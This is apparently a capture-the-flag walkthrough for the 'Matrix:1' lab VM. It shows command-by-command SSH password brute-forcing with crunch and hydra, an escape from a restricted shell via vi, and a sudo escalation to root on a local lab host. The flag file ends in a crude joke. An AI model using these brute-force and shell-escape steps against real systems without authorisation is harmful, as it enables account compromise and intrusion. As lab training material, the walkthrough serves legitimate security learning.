Matrix:1

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
[+] Content Discovery
[+] Split Brain / BrainF*CK decoding
[+] Password Generation with Crunch
[+] Hydra BruteForcing
[+] export PATH and SHELL environment variables
[+] Privilge Escalation abusing SUDO rights - /bin/cp
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Nmap Scanning

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Starting Nmap 7.70 ( https://nmap.org ) at 2019-10-02 09:17 EDT
Nmap scan report for 192.168.56.107
Host is up (0.00033s latency).
Not shown: 997 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 9c:8b:c7:7b:48:db:db:0c:4b:68:69:80:7b:12:4e:49 (RSA)
|   256 49:6c:23:38:fb:79:cb:e0:b3:fe:b2:f4:32:a2:70:8e (ECDSA)
|_  256 53:27:6f:04:ed:d1:e7:81:fb:00:98:54:e6:00:84:4a (ED25519)
80/tcp    open  http    SimpleHTTPServer 0.6 (Python 2.7.14)
|_http-server-header: SimpleHTTP/0.6 Python/2.7.14
|_http-title: Welcome in Matrix
31337/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.14)
|_http-title: Welcome in Matrix
MAC Address: 08:00:27:E5:B2:AA (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.33 ms 192.168.56.107

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.44 seconds

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Browsing to 192.168.56.107:31337 we get a Base64 string
ZWNobyAiVGhlbiB5b3UnbGwgc2VlLCB0aGF0IGl0IGlzIG5vdCB0aGUgc3Bvb24gdGhhdCBiZW5kcywgaXQgaXMgb25seSB5b3Vyc2VsZi4gIiA+IEN5cGhlci5tYXRyaXg=


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# echo 'ZWNobyAiVGhlbiB5b3UnbGwgc2VlLCB0aGF0IGl0IGlzIG5vdCB0aGUgc3Bvb24gdGhhdCBiZW5kcywgaXQgaXMgb25seSB5b3Vyc2VsZi4gIiA+IEN5cGhlci5tYXRyaXg=' | base64 -d
echo "Then you'll see, that it is not the spoon that bends, it is only yourself. " > Cypher.matrix
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Accessing http://192.168.56.107:31337/Cypher.matrix

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# wget http://192.168.56.107:31337/Cypher.matrix
--2019-10-02 09:42:15--  http://192.168.56.107:31337/Cypher.matrix
Connecting to 192.168.56.107:31337... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4121 (4.0K) [application/octet-stream]
Saving to: ‘Cypher.matrix’

Cypher.matrix                                       100%[================================================================================================================>]   4.02K  --.-KB/s    in 0s      

2019-10-02 09:42:15 (529 MB/s) - ‘Cypher.matrix’ saved [4121/4121]

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Looking at the file we see that it an econding

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# cat Cypher.matrix 
+++++ ++++[ ->+++ +++++ +<]>+ +++++ ++.<+ +++[- >++++ <]>++ ++++. +++++
+.<++ +++++ ++[-> ----- ----< ]>--- -.<++ +++++ +[->+ +++++ ++<]> +++.-
-.<++ +[->+ ++<]> ++++. <++++ ++++[ ->--- ----- <]>-- ----- ----- --.<+
+++++ ++[-> +++++ +++<] >++++ +.+++ +++++ +.+++ +++.< +++[- >---< ]>---
---.< +++[- >+++< ]>+++ +.<++ +++++ ++[-> ----- ----< ]>-.< +++++ +++[-
>++++ ++++< ]>+++ +++++ +.+++ ++.++ ++++. ----- .<+++ +++++ [->-- -----
-<]>- ----- ----- ----. <++++ ++++[ ->+++ +++++ <]>++ +++++ +++++ +.<++
+[->- --<]> ---.< ++++[ ->+++ +<]>+ ++.-- .---- ----- .<+++ [->++ +<]>+
+++++ .<+++ +++++ +[->- ----- ---<] >---- ---.< +++++ +++[- >++++ ++++<
]>+.< ++++[ ->+++ +<]>+ +.<++ +++++ ++[-> ----- ----< ]>--. <++++ ++++[
->+++ +++++ <]>++ +++++ .<+++ [->++ +<]>+ ++++. <++++ [->-- --<]> .<+++
[->++ +<]>+ ++++. +.<++ +++++ +[->- ----- --<]> ----- ---.< +++[- >---<
]>--- .<+++ +++++ +[->+ +++++ +++<] >++++ ++.<+ ++[-> ---<] >---- -.<++
+[->+ ++<]> ++.<+ ++[-> ---<] >---. <++++ ++++[ ->--- ----- <]>-- -----
-.<++ +++++ +[->+ +++++ ++<]> +++++ +++++ +++++ +.<++ +[->- --<]> -----
-.<++ ++[-> ++++< ]>++. .++++ .---- ----. +++.< +++[- >---< ]>--- --.<+
+++++ ++[-> ----- ---<] >---- .<+++ +++++ [->++ +++++ +<]>+ +++++ +++++
.<+++ ++++[ ->--- ----< ]>--- ----- -.<++ +++++ [->++ +++++ <]>++ +++++
+++.. <++++ +++[- >---- ---<] >---- ----- --.<+ +++++ ++[-> +++++ +++<]
>++.< +++++ [->-- ---<] >-..< +++++ +++[- >---- ----< ]>--- ----- ---.-
--.<+ +++++ ++[-> +++++ +++<] >++++ .<+++ ++[-> +++++ <]>++ +++++ +.+++
++.<+ ++[-> ---<] >---- --.<+ +++++ [->-- ----< ]>--- ----. <++++ +[->-
----< ]>-.< +++++ [->++ +++<] >++++ ++++. <++++ +[->+ ++++< ]>+++ +++++
+.<++ ++[-> ++++< ]>+.+ .<+++ +[->- ---<] >---- .<+++ [->++ +<]>+ +..<+
++[-> +++<] >++++ .<+++ +++++ [->-- ----- -<]>- ----- ----- --.<+ ++[->
---<] >---. <++++ ++[-> +++++ +<]>+ ++++. <++++ ++[-> ----- -<]>- ----.
<++++ ++++[ ->+++ +++++ <]>++ ++++. +++++ ++++. +++.< +++[- >---< ]>--.
--.<+ ++[-> +++<] >++++ ++.<+ +++++ +++[- >---- ----- <]>-- -.<++ +++++
+[->+ +++++ ++<]> +++++ +++++ ++.<+ ++[-> ---<] >--.< ++++[ ->+++ +<]>+
+.+.< +++++ ++++[ ->--- ----- -<]>- --.<+ +++++ +++[- >++++ +++++ <]>++
+.+++ .---- ----. <++++ ++++[ ->--- ----- <]>-- ----- ----- ---.< +++++
+++[- >++++ ++++< ]>+++ .++++ +.--- ----. <++++ [->++ ++<]> +.<++ ++[->
----< ]>-.+ +.<++ ++[-> ++++< ]>+.< +++[- >---< ]>--- ---.< +++[- >+++<
]>+++ +.+.< +++++ ++++[ ->--- ----- -<]>- -.<++ +++++ ++[-> +++++ ++++<
]>++. ----. <++++ ++++[ ->--- ----- <]>-- ----- ----- ---.< +++++ +[->+
+++++ <]>++ +++.< +++++ +[->- ----- <]>-- ---.< +++++ +++[- >++++ ++++<
]>+++ +++++ .---- ---.< ++++[ ->+++ +<]>+ ++++. <++++ [->-- --<]> -.<++
+++++ +[->- ----- --<]> ----- .<+++ +++++ +[->+ +++++ +++<] >+.<+ ++[->
---<] >---- .<+++ [->++ +<]>+ +.--- -.<++ +[->- --<]> --.++ .++.- .<+++
+++++ [->-- ----- -<]>- ---.< +++++ ++++[ ->+++ +++++ +<]>+ +++++ .<+++
[->-- -<]>- ----. <+++[ ->+++ <]>++ .<+++ [->-- -<]>- --.<+ +++++ ++[->
----- ---<] >---- ----. <++++ +++[- >++++ +++<] >++++ +++.. <++++ +++[-
>---- ---<] >---- ---.< +++++ ++++[ ->+++ +++++ +<]>+ ++.-- .++++ +++.<
+++++ ++++[ ->--- ----- -<]>- ----- --.<+ +++++ +++[- >++++ +++++ <]>++
+++++ +.<++ +[->- --<]> -.+++ +++.- --.<+ +++++ +++[- >---- ----- <]>-.
<++++ ++++[ ->+++ +++++ <]>++ +++++ +++++ .++++ +++++ .<+++ +[->- ---<]
>--.+ +++++ ++.<+ +++++ ++[-> ----- ---<] >---- ----- --.<+ +++++ ++[->
+++++ +++<] >+.<+ ++[-> +++<] >++++ .<+++ [->-- -<]>- .<+++ +++++ [->--
----- -<]>- ---.< +++++ +++[- >++++ ++++< ]>+++ +++.+ ++.++ +++.< +++[-
>---< ]>-.< +++++ +++[- >---- ----< ]>--- -.<++ +++++ +[->+ +++++ ++<]>
+++.< +++[- >+++< ]>+++ .+++. .<+++ [->-- -<]>- ---.- -.<++ ++[-> ++++<
]>+.< +++++ ++++[ ->--- ----- -<]>- --.<+ +++++ +++[- >++++ +++++ <]>++
.+.-- .---- ----- .++++ +.--- ----. <++++ ++++[ ->--- ----- <]>-- -----
.<+++ +++++ [->++ +++++ +<]>+ +++++ +++++ ++++. ----- ----. <++++ ++++[
->--- ----- <]>-- ----. <++++ ++++[ ->+++ +++++ <]>++ +++++ +++++ ++++.
<+++[ ->--- <]>-- ----. <++++ [->++ ++<]> ++..+ +++.- ----- --.++ +.<++
+[->- --<]> ----- .<+++ ++++[ ->--- ----< ]>--- --.<+ ++++[ ->--- --<]>
----- ---.- --.<

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



Browsing to : https://www.splitbrain.org/_static/ook/  we are able to decode this

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
You can enter into matrix as guest, with password k1ll0rXX
Note: Actually, I forget last two characters so I have replaced with XX try your luck and find correct string of password.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Generating a password list with crunch

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# crunch 8 8 -t k1ll0r%@ -o dict.txt
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Bruteforcing the password with hyrda

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# hydra -l guest -P dict.txt ssh://192.168.56.107
Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-10-02 09:56:14
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 260 login tries (l:1/p:260), ~17 tries per task
[DATA] attacking ssh://192.168.56.107:22/
[STATUS] 178.00 tries/min, 178 tries in 00:01h, 84 to do in 00:01h, 16 active
[22][ssh] host: 192.168.56.107   login: guest   password: k1ll0r7n
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 16 targets did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-10-02 09:57:19

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Password found : k1ll0r7n

Logging with ssh:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# ssh guest@192.168.56.107
guest@192.168.56.107's password: 
Last login: Wed Oct  2 14:05:28 2019 from 192.168.56.102
guest@porteus:~$ 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

We are in a restricted shell. But we have access to vi. We could use vi to escape the restricted shell

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
guest@porteus:~$ echo $SHELL
/bin/rbash
guest@porteus:~$ echo $PATH
/home/guest/prog
guest@porteus:~$ echo /home/guest/prog/*
/home/guest/prog/vi
guest@porteus:~$ 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Escape restricted shell with vi :     :!/bin/bash

In order to run linux command we have to export the SHELL and the PATH to /usr/bin

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
guest@porteus:~$ id
bash: id: command not found
guest@porteus:~$ export SHELL=/bin/bash:$SHELL
guest@porteus:~$ export PATH=/usr/bin:$PATH
guest@porteus:~$ id
uid=1000(guest) gid=100(users) groups=100(users),7(lp),11(floppy),17(audio),18(video),19(cdrom),83(plugdev),84(power),86(netdev),93(scanner),997(sambashare)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Getting root
We see that guest has sudo -l privileges. And root is for everyone. We have to add /bin to the existing PATH.


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
guest@porteus:~$ sudo -l
User guest may run the following commands on porteus:
    (ALL) ALL
    (root) NOPASSWD: /usr/lib64/xfce4/session/xfsm-shutdown-helper
    (trinity) NOPASSWD: /bin/cp
guest@porteus:~$ sudo su
Password: 
sudo: su: command not found
guest@porteus:~$ export PATH=/bin:$PATH
guest@porteus:~$ sudo su
root@porteus:/home/guest# id; whoami
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
root

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Getting the Flag

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@porteus:/home/guest# cat /root/flag.txt 
   _,-.                                                             
,-'  _|                  EVER REWIND OVER AND OVER AGAIN THROUGH THE
|_,-O__`-._              INITIAL AGENT SMITH/NEO INTERROGATION SCENE
|`-._\`.__ `_.           IN THE MATRIX AND BEAT OFF                 
|`-._`-.\,-'_|  _,-'.                                               
     `-.|.-' | |`.-'|_     WHAT                                     
        |      |_|,-'_`.                                            
              |-._,-'  |     NO, ME NEITHER                         
         jrei | |    _,'                                            
              '-|_,-'          IT'S JUST A HYPOTHETICAL QUESTION    

root@porteus:/home/guest# 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

